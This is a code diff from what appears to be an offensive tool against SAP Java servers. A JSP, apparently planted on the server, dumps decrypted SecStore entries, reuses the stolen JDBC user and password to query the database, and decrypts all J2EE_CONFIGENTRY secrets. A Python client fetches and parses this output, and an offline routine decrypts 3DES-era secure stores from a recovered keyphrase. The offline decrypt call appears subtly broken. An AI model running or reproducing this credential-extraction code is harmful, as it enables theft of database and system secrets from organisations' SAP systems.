@@ -116,13 +116,113 @@ try {
     // Dump decrypted key=value pairs.  getStringPairs() returns java.util.Properties.
     java.util.Properties pairs = (java.util.Properties)
         SSF.getMethod("getStringPairs").invoke(inst);
-    out.println("### ENTRIES");
+    out.println("### FILE_ENTRIES");
+    String jdbcPoolValue = null;
     for (String name : pairs.stringPropertyNames()) {
         String value = pairs.getProperty(name);
         byte[] vb = (value == null) ? new byte[0] : value.getBytes("UTF-8");
         String b64 = java.util.Base64.getEncoder().encodeToString(vb);
         out.println(name + "=" + b64);
+        if (name.toLowerCase().startsWith("jdbc/pool/")) {
+            jdbcPoolValue = value;
+        }
     }
+
+    // === J2EE_CONFIGENTRY dump (phase 2) ===
+    // Caller can disable by passing include_configentry=0.
+    String inclCE = request.getParameter("include_configentry");
+    boolean doCE = (inclCE == null || !"0".equals(inclCE));
+
+    if (doCE && jdbcPoolValue != null) {
+        out.println("### CONFIG_ENTRIES");
+        String cleaned = jdbcPoolValue.replace("\\", "");
+        // Parse the inner JDBC URL + driver class + user/password
+        java.util.regex.Matcher mDrv = java.util.regex.Pattern
+            .compile("ClassName\\s*=\\s*([A-Za-z0-9_.]+)")
+            .matcher(cleaned);
+        String drvClass = mDrv.find() ? mDrv.group(1) : null;
+        java.util.regex.Matcher mUrl = java.util.regex.Pattern
+            .compile("Url\\s*=\\s*(jdbc:[^&;]+)")
+            .matcher(cleaned);
+        String url = mUrl.find() ? mUrl.group(1).trim() : null;
+        java.util.regex.Matcher mUser = java.util.regex.Pattern
+            .compile("[?&;]User\\s*=\\s*([^&;]+)", java.util.regex.Pattern.CASE_INSENSITIVE)
+            .matcher(cleaned);
+        String dbUser = mUser.find() ? mUser.group(1).trim() : null;
+        java.util.regex.Matcher mPwd = java.util.regex.Pattern
+            .compile("[?&;]Password\\s*=\\s*([^&;]*)", java.util.regex.Pattern.CASE_INSENSITIVE)
+            .matcher(cleaned);
+        String dbPwd = mPwd.find() ? mPwd.group(1).trim() : "";
+
+        out.println("# jdbc_driver=" + drvClass);
+        out.println("# jdbc_url=" + url);
+        out.println("# jdbc_user=" + dbUser);
+
+        java.sql.Connection conn = null;
+        try {
+            if (drvClass != null) {
+                Class.forName(drvClass);
+            }
+            if (url == null || dbUser == null) {
+                out.println("# configentry_error=JDBC URL or user missing");
+            } else {
+                conn = java.sql.DriverManager.getConnection(url, dbUser, dbPwd);
+                java.sql.PreparedStatement ps = conn.prepareStatement(
+                    "SELECT CID, NAME, VBYTES FROM J2EE_CONFIGENTRY "
+                    + "WHERE VBYTES IS NOT NULL");
+                java.sql.ResultSet rs = ps.executeQuery();
+                java.lang.reflect.Method decryptM =
+                    SSF.getMethod("decrypt", byte[].class);
+                int count = 0, okCount = 0;
+                while (rs.next()) {
+                    count++;
+                    String cid  = rs.getString("CID");
+                    String name = rs.getString("NAME");
+                    byte[] blob = rs.getBytes("VBYTES");
+                    if (blob == null || blob.length == 0) continue;
+                    try {
+                        byte[] pt = (byte[]) decryptM.invoke(inst, (Object) blob);
+                        // Plaintext may have a 4-byte length prefix (common
+                        // in SAP's config-entry format).  Trim heuristically:
+                        // if the first 4 bytes form an int that matches the
+                        // remaining length, strip them.
+                        if (pt != null && pt.length >= 4) {
+                            int declared = ((pt[0] & 0xff) << 24)
+                                          | ((pt[1] & 0xff) << 16)
+                                          | ((pt[2] & 0xff) << 8)
+                                          |  (pt[3] & 0xff);
+                            if (declared > 0 && declared <= pt.length - 4) {
+                                byte[] trimmed = new byte[declared];
+                                System.arraycopy(pt, 4, trimmed, 0, declared);
+                                pt = trimmed;
+                            }
+                        }
+                        String plain = (pt == null) ? ""
+                            : new String(pt, "UTF-8");
+                        String b64 = java.util.Base64.getEncoder()
+                            .encodeToString(plain.getBytes("UTF-8"));
+                        out.println(cid + "::" + name + "=" + b64);
+                        okCount++;
+                    } catch (Throwable dt) {
+                        out.println("# decrypt_failed cid=" + cid
+                            + " name=" + name + " err="
+                            + dt.getClass().getSimpleName());
+                    }
+                }
+                rs.close(); ps.close();
+                out.println("# configentry_total=" + count
+                    + " decrypted=" + okCount);
+            }
+        } catch (Throwable cet) {
+            Throwable cec = cet;
+            while (cec.getCause() != null) cec = cec.getCause();
+            out.println("# configentry_error=" + cec.getClass().getSimpleName()
+                + ": " + cec.getMessage());
+        } finally {
+            if (conn != null) try { conn.close(); } catch (Exception ex) {}
+        }
+    }
+
     out.println("### END");
 } catch (Throwable t) {
     Throwable c = t;
@@ -164,7 +264,8 @@ def invoke_secstore_jsp(jsp_url: str, sid: str,
     req = urllib.request.Request(url, headers={"User-Agent": _UA})
 
     result = {"success": False, "version": "", "algorithm": "",
-              "entries": [], "error": "", "raw": ""}
+              "entries": [], "config_entries": [],
+              "jdbc_meta": {}, "error": "", "raw": ""}
     try:
         with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
             text = r.read().decode("latin1", errors="replace")
@@ -181,16 +282,17 @@ def invoke_secstore_jsp(jsp_url: str, sid: str,
         return result
 
     result["raw"] = text
-    in_entries = False
+    section = None    # None | "file" | "config"
     for line in text.splitlines():
-        if line == "### ENTRIES":
-            in_entries = True
-            continue
+        if line == "### FILE_ENTRIES" or line == "### ENTRIES":
+            section = "file"; continue
+        if line == "### CONFIG_ENTRIES":
+            section = "config"; continue
         if line == "### END":
-            in_entries = False
+            section = None
             result["success"] = True
             continue
-        if not in_entries:
+        if section is None:
             if line.startswith("version="):
                 result["version"] = line[len("version="):]
             elif line.startswith("algorithm="):
@@ -201,6 +303,16 @@ def invoke_secstore_jsp(jsp_url: str, sid: str,
                 result["error"] = (result.get("error") + " / " if result["error"]
                                     else "") + line[len("error="):]
             continue
+        # Inside a section.  Lines starting with "#" are metadata/diagnostics,
+        # not entries.
+        if line.startswith("#"):
+            if section == "config":
+                # parse "# jdbc_driver=..." etc. for the jdbc_meta dict
+                stripped = line.lstrip("# ").strip()
+                if "=" in stripped:
+                    k, v = stripped.split("=", 1)
+                    result["jdbc_meta"][k] = v
+            continue
         if "=" not in line:
             continue
         name, b64val = line.split("=", 1)
@@ -208,7 +320,16 @@ def invoke_secstore_jsp(jsp_url: str, sid: str,
             plain = base64.b64decode(b64val).decode("utf-8", errors="replace")
         except Exception:
             plain = ""
-        result["entries"].append({"name": name, "value": plain})
+        if section == "config":
+            # config-entry rows encode name as "<CID>::<NAME>"
+            if "::" in name:
+                cid, ename = name.split("::", 1)
+            else:
+                cid, ename = "", name
+            result["config_entries"].append(
+                {"cid": cid, "name": ename, "value": plain})
+        else:
+            result["entries"].append({"name": name, "value": plain})
     return result
 
 
@@ -303,6 +424,116 @@ def extract_keyphrase(key_bytes: bytes) -> tuple:
         raise ValueError(f"key tail too short ({len(raw)}B)")
     keyphrase = bytes(a ^ b for a, b in zip(raw, _XOR_CONSTANT))
     return version, keyphrase
+
+
+# ---------------------------------------------------------------------------
+# Version-based algorithm router
+# ---------------------------------------------------------------------------
+
+# Reported algorithm mapping by SecStore.key version prefix (from SAP wiki
+# summaries of Note 3153525 "Improvement of SecureStoreFS encryption
+# algorithms").  Used to pick a decryption path for offline mode.
+_ALGORITHM_BY_VERSION = [
+    (re.compile(r"^7\.00\."),    "3DES"),
+    (re.compile(r"^7\.50\.000\.004"), "AES128"),
+    (re.compile(r"^7\.50\.000\.005"), "AES256"),
+]
+
+
+def detect_algorithm(version: str) -> str:
+    """Return "3DES" | "AES128" | "AES256" | "unknown" based on version tag."""
+    for rx, alg in _ALGORITHM_BY_VERSION:
+        if rx.match(version or ""):
+            return alg
+    return "unknown"
+
+
+def decrypt_files_offline(properties_text: str, key_bytes: bytes,
+                            sid: str = "") -> dict:
+    """Offline Python decryption for files-only scenarios (no JSP access).
+
+    Currently only the 3DES-era algorithm is implemented — it matches the
+    ERPScan recipe:
+
+        digest = PBE-SHA1(keyphrase + [SID if version < 7.00])
+        salt   = 16 zero bytes
+        iters  = 0
+        cipher = 3DES/CBC
+
+    For AES-era (7.50.000.004 and newer) stores the key-derivation details
+    are not publicly documented; when we encounter one we return a helpful
+    error directing the caller to use the JSP (server-side) path instead.
+
+    Returns dict {success, version, algorithm, entries, error}.
+    """
+    result = {"success": False, "version": "", "algorithm": "",
+              "entries": {}, "error": ""}
+    try:
+        version, keyphrase = extract_keyphrase(key_bytes)
+    except Exception as e:
+        result["error"] = f"key parse failed: {e}"
+        return result
+    result["version"] = version
+    algorithm = detect_algorithm(version)
+    result["algorithm"] = algorithm
+
+    if algorithm in ("AES128", "AES256", "unknown"):
+        # We know where the algorithm gate is, but don't have a test sample
+        # to reverse the AES key-derivation parameters (PBKDF2 iters + salt
+        # layout would need to be lifted from the SAP class bytecode on a
+        # real target).  Fail with a clear actionable message so the caller
+        # falls back to the JSP-driven path that uses the server's own
+        # SecStoreFS implementation.
+        result["error"] = (
+            f"offline decrypt for {algorithm} not implemented — "
+            f"use the JSP / server-side path "
+            f"(sap_java_secstore.invoke_secstore_jsp)")
+        return result
+
+    # 3DES path — requires the third-party `pyjks` library for the PBE
+    # primitive.  Imported lazily so it's only a runtime requirement when
+    # someone actually uses offline mode.
+    try:
+        import jks.util as _jksu  # type: ignore
+    except ImportError:
+        result["error"] = ("3DES offline decrypt requires pyjks "
+                            "(`pip install pyjks`); or use the JSP path")
+        return result
+
+    # Version < 7.00 appends the SID to the keyphrase.
+    try:
+        major_minor = int(version.split(".")[0] + version.split(".")[1])
+    except Exception:
+        major_minor = 700
+    effective_key = keyphrase
+    if major_minor < 700 and sid:
+        effective_key = keyphrase + sid.encode("utf-8")
+    salt = b"\x00" * 16
+    iters = 0
+
+    entries = {}
+    for line in properties_text.splitlines():
+        line = line.strip()
+        if not line or line.startswith("#") or "$internal" in line:
+            continue
+        if "=" not in line:
+            continue
+        name, b64 = line.split("=", 1)
+        try:
+            ct = base64.b64decode(b64)
+            pt = _jksu.derive_key_and_iv("sha1", effective_key, salt,
+                                           iters, "DES-EDE3-CBC", ct)
+            # Strip length prefix if present
+            if len(pt) >= 4:
+                declared = int.from_bytes(pt[:4], "big")
+                if 0 < declared <= len(pt) - 4:
+                    pt = pt[4:4 + declared]
+            entries[name] = pt.decode("utf-8", errors="replace")
+        except Exception as e:
+            entries[name] = f"<decrypt error: {e}>"
+    result["entries"] = entries
+    result["success"] = True
+    return result
 
 
 # ---------------------------------------------------------------------------
